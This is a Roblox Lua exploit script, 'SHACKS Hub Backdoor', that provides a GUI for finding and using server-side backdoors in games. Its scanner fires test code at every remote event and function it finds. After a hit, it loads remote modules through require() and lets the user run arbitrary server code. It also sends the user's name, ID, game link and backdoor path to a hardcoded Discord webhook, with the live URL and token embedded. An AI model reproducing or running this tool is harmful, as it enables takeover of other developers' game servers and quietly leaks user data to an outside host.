local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "SHACKS_Hub_Backdoor"
ScreenGui.Parent = game:GetService("CoreGui"):WaitForChild("RobloxGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

-- Main container
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 500, 0, 400)
MainFrame.Position = UDim2.new(0.5, -250, 0.5, -200)
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.BackgroundColor3 = Color3.fromRGB(10, 15, 40)
MainFrame.BackgroundTransparency = 0.05
MainFrame.Parent = ScreenGui

-- UI Corners
local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 12)
UICorner.Parent = MainFrame

-- Header
local Header = Instance.new("Frame")
Header.Name = "Header"
Header.Size = UDim2.new(1, 0, 0, 50)
Header.BackgroundTransparency = 1
Header.Parent = MainFrame

local Title = Instance.new("TextLabel")
Title.Name = "Title"
Title.Text = "SHACKS HUB BACKDOOR"
Title.Font = Enum.Font.GothamBold
Title.TextSize = 24
Title.TextColor3 = Color3.fromRGB(100, 180, 255)
Title.TextTransparency = 0.1
Title.Size = UDim2.new(1, -40, 1, 0)
Title.Position = UDim2.new(0, 20, 0, 0)
Title.BackgroundTransparency = 1
Title.Parent = Header

local CloseButton = Instance.new("TextButton")
CloseButton.Name = "CloseButton"
CloseButton.Text = "X"
CloseButton.Font = Enum.Font.GothamBold
CloseButton.TextSize = 20
CloseButton.TextColor3 = Color3.fromRGB(200, 200, 255)
CloseButton.Size = UDim2.new(0, 30, 0, 30)
CloseButton.Position = UDim2.new(1, -35, 0.5, -15)
CloseButton.BackgroundColor3 = Color3.fromRGB(30, 40, 80)
CloseButton.Parent = Header

-- Tab buttons
local TabButtons = Instance.new("Frame")
TabButtons.Name = "TabButtons"
TabButtons.Size = UDim2.new(1, -40, 0, 40)
TabButtons.Position = UDim2.new(0, 20, 0, 50)
TabButtons.BackgroundTransparency = 1
TabButtons.Parent = MainFrame

-- Update tab sizes for 3 tabs
local ScannerTab = Instance.new("TextButton")
ScannerTab.Name = "ScannerTab"
ScannerTab.Text = "SCANNER"
ScannerTab.Size = UDim2.new(0.33, -4, 1, 0)
ScannerTab.Font = Enum.Font.GothamBold
ScannerTab.TextSize = 16
ScannerTab.TextColor3 = Color3.fromRGB(150, 200, 255)
ScannerTab.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
ScannerTab.Parent = TabButtons

local UICorner_Scanner = Instance.new("UICorner")
UICorner_Scanner.CornerRadius = UDim.new(0, 6)
UICorner_Scanner.Parent = ScannerTab

local ExecutorTab = Instance.new("TextButton")
ExecutorTab.Name = "ExecutorTab"
ExecutorTab.Text = "EXECUTOR"
ExecutorTab.Size = UDim2.new(0.33, -4, 1, 0)
ExecutorTab.Position = UDim2.new(0.33, 4, 0, 0)
ExecutorTab.Font = Enum.Font.GothamBold
ExecutorTab.TextSize = 16
ExecutorTab.TextColor3 = Color3.fromRGB(150, 200, 255)
ExecutorTab.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
ExecutorTab.Parent = TabButtons

local UICorner_Executor = Instance.new("UICorner")
UICorner_Executor.CornerRadius = UDim.new(0, 6)
UICorner_Executor.Parent = ExecutorTab

-- NEW: Scripts Tab
local ScriptsTab = Instance.new("TextButton")
ScriptsTab.Name = "ScriptsTab"
ScriptsTab.Text = "SCRIPTS"
ScriptsTab.Size = UDim2.new(0.33, -4, 1, 0)
ScriptsTab.Position = UDim2.new(0.66, 4, 0, 0)
ScriptsTab.Font = Enum.Font.GothamBold
ScriptsTab.TextSize = 16
ScriptsTab.TextColor3 = Color3.fromRGB(150, 200, 255)
ScriptsTab.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
ScriptsTab.Parent = TabButtons

local UICorner_Scripts = Instance.new("UICorner")
UICorner_Scripts.CornerRadius = UDim.new(0, 6)
UICorner_Scripts.Parent = ScriptsTab

-- Content frame
local ContentFrame = Instance.new("Frame")
ContentFrame.Name = "ContentFrame"
ContentFrame.Size = UDim2.new(1, -40, 1, -120)
ContentFrame.Position = UDim2.new(0, 20, 0, 100)
ContentFrame.BackgroundTransparency = 1
ContentFrame.Parent = MainFrame

-- Scanner content
local ScannerFrame = Instance.new("Frame")
ScannerFrame.Name = "ScannerFrame"
ScannerFrame.Size = UDim2.new(1, 0, 1, 0)
ScannerFrame.BackgroundTransparency = 1
ScannerFrame.Visible = true
ScannerFrame.Parent = ContentFrame

local ScanButton = Instance.new("TextButton")
ScanButton.Name = "ScanButton"
ScanButton.Text = "START SCANNING"
ScanButton.Font = Enum.Font.GothamBold
ScanButton.TextSize = 22
ScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ScanButton.Size = UDim2.new(1, 0, 0, 50)
ScanButton.Position = UDim2.new(0, 0, 0.4, -25)
ScanButton.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
ScanButton.Parent = ScannerFrame

local UICorner_Scan = Instance.new("UICorner")
UICorner_Scan.CornerRadius = UDim.new(0, 8)
UICorner_Scan.Parent = ScanButton

local UIStroke_Scan = Instance.new("UIStroke")
UIStroke_Scan.Color = Color3.fromRGB(100, 180, 255)
UIStroke_Scan.Thickness = 2
UIStroke_Scan.Parent = ScanButton

local ScanStatus = Instance.new("TextLabel")
ScanStatus.Name = "ScanStatus"
ScanStatus.Text = "Ready to scan for backdoors"
ScanStatus.Font = Enum.Font.Gotham
ScanStatus.TextSize = 16
ScanStatus.TextColor3 = Color3.fromRGB(150, 200, 255)
ScanStatus.Size = UDim2.new(1, 0, 0, 30)
ScanStatus.Position = UDim2.new(0, 0, 0.4, 40)
ScanStatus.BackgroundTransparency = 1
ScanStatus.TextXAlignment = Enum.TextXAlignment.Center
ScanStatus.Parent = ScannerFrame

-- Executor content
local ExecutorFrame = Instance.new("Frame")
ExecutorFrame.Name = "ExecutorFrame"
ExecutorFrame.Size = UDim2.new(1, 0, 1, 0)
ExecutorFrame.BackgroundTransparency = 1
ExecutorFrame.Visible = false
ExecutorFrame.Parent = ContentFrame

local EditorFrame = Instance.new("Frame")
EditorFrame.Name = "EditorFrame"
EditorFrame.Size = UDim2.new(1, 0, 0.7, 0)
EditorFrame.BackgroundColor3 = Color3.fromRGB(15, 25, 50)
EditorFrame.Parent = ExecutorFrame

local UICorner_Editor = Instance.new("UICorner")
UICorner_Editor.CornerRadius = UDim.new(0, 8)
UICorner_Editor.Parent = EditorFrame

local EditorScroller = Instance.new("ScrollingFrame")
EditorScroller.Name = "EditorScroller"
EditorScroller.Size = UDim2.new(1, 0, 1, 0)
EditorScroller.BackgroundTransparency = 1
EditorScroller.BorderSizePixel = 0
EditorScroller.ScrollBarThickness = 8
EditorScroller.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar
EditorScroller.Parent = EditorFrame

local Editor = Instance.new("TextBox")
Editor.Name = "Editor"
Editor.Text = ""
Editor.Font = Enum.Font.RobotoMono
Editor.TextSize = 14
Editor.TextColor3 = Color3.fromRGB(200, 220, 255)
Editor.TextXAlignment = Enum.TextXAlignment.Left
Editor.TextYAlignment = Enum.TextYAlignment.Top
Editor.BackgroundTransparency = 1
Editor.Size = UDim2.new(1, -5, 1, 0)
Editor.Position = UDim2.new(0, 5, 0, 0)
Editor.MultiLine = true
Editor.TextWrapped = false
Editor.ClearTextOnFocus = false
Editor.PlaceholderText = "Enter your script here..."
Editor.PlaceholderColor3 = Color3.fromRGB(120, 140, 180)
Editor.Parent = EditorScroller

local ButtonFrame = Instance.new("Frame")
ButtonFrame.Name = "ButtonFrame"
ButtonFrame.Size = UDim2.new(1, 0, 0.3, -10)
ButtonFrame.Position = UDim2.new(0, 0, 0.7, 10)
ButtonFrame.BackgroundTransparency = 1
ButtonFrame.Parent = ExecutorFrame

local ExecuteButton = Instance.new("TextButton")
ExecuteButton.Name = "ExecuteButton"
ExecuteButton.Text = "EXECUTE"
ExecuteButton.Font = Enum.Font.GothamBold
ExecuteButton.TextSize = 18
ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ExecuteButton.Size = UDim2.new(0.6, -5, 0.8, 0)
ExecuteButton.Position = UDim2.new(0, 0, 0.1, 0)
ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 150, 100)
ExecuteButton.Parent = ButtonFrame

local UICorner_Execute = Instance.new("UICorner")
UICorner_Execute.CornerRadius = UDim.new(0, 8)
UICorner_Execute.Parent = ExecuteButton

local UIStroke_Execute = Instance.new("UIStroke")
UIStroke_Execute.Color = Color3.fromRGB(100, 255, 200)
UIStroke_Execute.Thickness = 2
UIStroke_Execute.Parent = ExecuteButton

local ClearButton = Instance.new("TextButton")
ClearButton.Name = "ClearButton"
ClearButton.Text = "CLEAR"
ClearButton.Font = Enum.Font.GothamBold
ClearButton.TextSize = 18
ClearButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ClearButton.Size = UDim2.new(0.4, -5, 0.8, 0)
ClearButton.Position = UDim2.new(0.6, 5, 0.1, 0)
ClearButton.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
ClearButton.Parent = ButtonFrame

local UICorner_Clear = Instance.new("UICorner")
UICorner_Clear.CornerRadius = UDim.new(0, 8)
UICorner_Clear.Parent = ClearButton

local UIStroke_Clear = Instance.new("UIStroke")
UIStroke_Clear.Color = Color3.fromRGB(100, 180, 255)
UIStroke_Clear.Thickness = 2
UIStroke_Clear.Parent = ClearButton

-- NEW: Scripts content
local ScriptsFrame = Instance.new("Frame")
ScriptsFrame.Name = "ScriptsFrame"
ScriptsFrame.Size = UDim2.new(1, 0, 1, 0)
ScriptsFrame.BackgroundTransparency = 1
ScriptsFrame.Visible = false
ScriptsFrame.Parent = ContentFrame

-- Sensation Hub button
local SensationButton = Instance.new("TextButton")
SensationButton.Name = "SensationButton"
SensationButton.Text = "SENSATION HUB"
SensationButton.Font = Enum.Font.GothamBold
SensationButton.TextSize = 20
SensationButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SensationButton.Size = UDim2.new(0.8, 0, 0, 50)
SensationButton.Position = UDim2.new(0.1, 0, 0.3, 0)
SensationButton.BackgroundColor3 = Color3.fromRGB(120, 80, 200)
SensationButton.Parent = ScriptsFrame

local UICorner_Sensation = Instance.new("UICorner")
UICorner_Sensation.CornerRadius = UDim.new(0, 8)
UICorner_Sensation.Parent = SensationButton

local UIStroke_Sensation = Instance.new("UIStroke")
UIStroke_Sensation.Color = Color3.fromRGB(180, 140, 255)
UIStroke_Sensation.Thickness = 2
UIStroke_Sensation.Parent = SensationButton

-- Script description
local SensationDesc = Instance.new("TextLabel")
SensationDesc.Name = "SensationDesc"
SensationDesc.Text = "Executes Sensation Hub with your username"
SensationDesc.Font = Enum.Font.Gotham
SensationDesc.TextSize = 14
SensationDesc.TextColor3 = Color3.fromRGB(180, 200, 255)
SensationDesc.Size = UDim2.new(1, 0, 0, 30)
SensationDesc.Position = UDim2.new(0, 0, 0.3, 60)
SensationDesc.BackgroundTransparency = 1
SensationDesc.TextXAlignment = Enum.TextXAlignment.Center
SensationDesc.Parent = ScriptsFrame

-- Visual elements
local HeaderDivider = Instance.new("Frame")
HeaderDivider.Name = "HeaderDivider"
HeaderDivider.Size = UDim2.new(1, -40, 0, 1)
HeaderDivider.Position = UDim2.new(0, 20, 0, 95)
HeaderDivider.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
HeaderDivider.BorderSizePixel = 0
HeaderDivider.Parent = MainFrame

local BottomGlow = Instance.new("Frame")
BottomGlow.Name = "BottomGlow"
BottomGlow.Size = UDim2.new(1, 0, 0, 4)
BottomGlow.Position = UDim2.new(0, 0, 1, -4)
BottomGlow.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
BottomGlow.BorderSizePixel = 0
BottomGlow.Parent = MainFrame

local UIGradient = Instance.new("UIGradient")
UIGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 150, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 50, 150))
})
UIGradient.Rotation = 90
UIGradient.Parent = BottomGlow

-- Drop shadow effect
local DropShadow = Instance.new("ImageLabel")
DropShadow.Name = "DropShadow"
DropShadow.Image = "rbxassetid://1316045217"
DropShadow.ImageColor3 = Color3.new(0, 0, 0)
DropShadow.ImageTransparency = 0.8
DropShadow.ScaleType = Enum.ScaleType.Slice
DropShadow.SliceCenter = Rect.new(10, 10, 118, 118)
DropShadow.Size = UDim2.new(1, 40, 1, 40)
DropShadow.Position = UDim2.new(0, -20, 0, -20)
DropShadow.BackgroundTransparency = 1
DropShadow.Parent = MainFrame

-- Tab switching logic
ScannerTab.MouseButton1Click:Connect(function()
    ScannerFrame.Visible = true
    ExecutorFrame.Visible = false
    ScriptsFrame.Visible = false
    ScannerTab.BackgroundColor3 = Color3.fromRGB(30, 60, 120)
    ExecutorTab.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
    ScriptsTab.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
end)

ExecutorTab.MouseButton1Click:Connect(function()
    ScannerFrame.Visible = false
    ExecutorFrame.Visible = true
    ScriptsFrame.Visible = false
    ExecutorTab.BackgroundColor3 = Color3.fromRGB(30, 60, 120)
    ScannerTab.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
    ScriptsTab.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
end)

-- NEW: Scripts tab switching
ScriptsTab.MouseButton1Click:Connect(function()
    ScannerFrame.Visible = false
    ExecutorFrame.Visible = false
    ScriptsFrame.Visible = true
    ScriptsTab.BackgroundColor3 = Color3.fromRGB(30, 60, 120)
    ScannerTab.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
    ExecutorTab.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
end)

-- Initial tab state
ScannerTab.BackgroundColor3 = Color3.fromRGB(30, 60, 120)
ExecutorTab.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
ScriptsTab.BackgroundColor3 = Color3.fromRGB(20, 40, 80)

-- Dragging functionality
local UserInputService = game:GetService("UserInputService")
local dragging
local dragInput
local dragStart
local startPos

local function UpdateInput(input)
    local delta = input.Position - dragStart
    MainFrame.Position = UDim2.new(
        startPos.X.Scale,
        startPos.X.Offset + delta.X,
        startPos.Y.Scale,
        startPos.Y.Offset + delta.Y
    )
end

MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

MainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        UpdateInput(input)
    end
end)

-- Close button functionality
CloseButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

-- Toggle Visibility with Alt Key
UserInputService.InputBegan:Connect(function(input, processed)
    if input.KeyCode == Enum.KeyCode.LeftAlt and not processed then
        MainFrame.Visible = not MainFrame.Visible
    end
end)

-- Backdoor scanning functionality
local HttpService = game:GetService("HttpService")
local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
local backdoor = nil
local searching = false

local function debug(text, lvl)
    local func = print
    if lvl == 1 then func = print end
    if lvl == 2 then func = error end
    if lvl == 3 then func = warn end
    func('SHACKS Hub Backdoor: '..text)
end

local function notify(text)
    game:GetService('StarterGui'):SetCore("SendNotification", {
        Title = "SHACKS Hub Backdoor",
        Duration = 6,
        Text = text
    })
end

local function runRemote(remote, data)
    if remote:IsA('RemoteEvent') then
        remote:FireServer(data)
    elseif remote:IsA('RemoteFunction') then
        spawn(function() remote:InvokeServer(data) end)
    end
end

local function generateName(length)
    local text = ''
    for i = 1, length do
        text = text .. alphabet[math.random(1, #alphabet)]
    end
    return text
end

local function findRemote()
    local timee = os.clock()
    local remotes = {}
    local code
    
    -- Check protected backdoor first
    local protected_backdoor = game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
    if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
        while true do
            code = generateName(math.random(12,30))
            if not remotes[code] then break end
        end
        spawn(function() 
            protected_backdoor:InvokeServer('shacks hub join today!! discord.gg/XXqzxT7E5z', "a=Instance.new('Model',workspace)a.Name='"..code.."'") 
        end)
        remotes[code] = protected_backdoor
    end
    
    -- Scan all remotes
    for _, remote in ipairs(game:GetDescendants()) do
        if not (remote:IsA('RemoteEvent') or remote:IsA('RemoteFunction')) then continue end
        
        -- Skip RobloxReplicatedStorage
        if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then
            debug('Skipping Roblox Replicated Storage: '..remote.Name, 1)
            continue
        end
        
        -- Generate unique code
        while true do
            code = generateName(math.random(12,30))
            if not remotes[code] then break end
        end
        
        -- Send test command
        runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
        remotes[code] = remote
        debug('Testing remote: '..remote:GetFullName(), 1)
    end
    
    -- Check for successful backdoors
    for i = 1, 50 do
        for code, remote in pairs(remotes) do
            if workspace:FindFirstChild(code) then
                notify('Backdoor found in '..(os.clock()-timee)..' seconds!')
                backdoor = remote
                debug('Backdoor found: '..remote:GetFullName(), 3)
                
                -- Send initialization commands
                runRemote(remote, "require(171016405.1884*69)")            
                runRemote(remote, "''while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
                
                -- Optional: Send to Discord webhook
                local request = (syn and syn.request) or (http and http.request) or http_request
                if request and not _G.LALOL_Hub_Backdoor_Logs_Disabled then 
                    request({
                        Url = 'https://discord.com/api/webhooks/1108694160464158781/9VCz_ck4ux3M3TQj8moLDq3Nw-dkYDW7gEcaLHKPbe2_JJIz5m2fEh6eSnp33WOLTgi1',
                        Method = 'POST',
                        Headers = {['Content-Type'] = 'application/json'},
                        Body = HttpService:JSONEncode({
                            username = 'SHACKS Hub Backdoor',
                            content = "**User:** `"..game:GetService('Players').LocalPlayer.Name.."` | `"..game:GetService('Players').LocalPlayer.UserId.."`\n**Game:** https://www.roblox.com/games/"..game.PlaceId.."\n**Backdoor:** `"..backdoor:GetFullName().."`"
                        })
                    })
                end
                
                return true
            end
        end
        wait(0.1)
    end
    
    return false
end

-- Button functionality
ScanButton.MouseButton1Click:Connect(function()
    if not searching then
        searching = true
        ScanButton.Text = "SCANNING..."
        ScanStatus.Text = "Searching for backdoors..."
        
        if not findRemote() then
            ScanButton.Text = "SCAN FAILED"
            ScanStatus.Text = "No backdoors found"
            searching = false
            wait(1.5)
            ScanButton.Text = "START SCANNING"
            ScanStatus.Text = "Ready to scan for backdoors"
        else
            ScanButton.Text = "BACKDOOR FOUND"
            ScanStatus.Text = "Remote executor is ready"
        end
    end
end)

ExecuteButton.MouseButton1Click:Connect(function()
    local scriptText = Editor.Text
    if backdoor and scriptText ~= "" then
        ExecuteButton.Text = "EXECUTING..."
        
        -- Replace username placeholder
        scriptText = string.gsub(scriptText, '%%username%%', game:GetService('Players').LocalPlayer.Name)
        
        -- Check for protected backdoor
        local protected_backdoor = game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
        if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
            spawn(function()
                local success, result = pcall(function() 
                    return protected_backdoor:InvokeServer('', scriptText) 
                end)
                if result then
                    notify("Execution result: "..tostring(result))
                end
            end)
        else
            runRemote(backdoor, scriptText)
        end
        
        wait(0.5)
        ExecuteButton.Text = "EXECUTED!"
        wait(1)
        ExecuteButton.Text = "EXECUTE"
    end
end)

ClearButton.MouseButton1Click:Connect(function()
    Editor.Text = ""
    ClearButton.Text = "CLEARED!"
    wait(0.7)
    ClearButton.Text = "CLEAR"
end)

-- NEW: Sensation Hub button functionality
SensationButton.MouseButton1Click:Connect(function()
    local player = game:GetService("Players").LocalPlayer
    local nickname = player.Name  -- Use player's username
    
    SensationButton.Text = "EXECUTING..."
    
    -- Create the command with the player's nickname
    local command = string.format('require(100263845596551)("%s")', nickname)
    
    if backdoor then
        -- Execute via the found backdoor
        runRemote(backdoor, command)
    else
        -- If no backdoor found, try to execute locally
        local success, err = pcall(function()
            loadstring(command)()
        end)
        
        if not success then
            notify("Error executing Sensation Hub: "..tostring(err))
        end
    end
    
    notify("Executed Sensation Hub for: "..nickname)
    SensationButton.Text = "SENSATION HUB"
end)

-- Initialize
notify("SHACKS Hub Backdoor loaded! Press Alt to toggle menu")

-- Fix for editor scrolling
Editor:GetPropertyChangedSignal("Text"):Connect(function()
    EditorScroller.CanvasSize = UDim2.new(0, 0, 0, Editor.TextBounds.Y + 20)
end)

-- Make textbox automatically expand
Editor:GetPropertyChangedSignal("TextBounds"):Connect(function()
    Editor.Size = UDim2.new(1, -5, 0, math.max(Editor.TextBounds.Y + 20, EditorScroller.AbsoluteSize.Y))
end)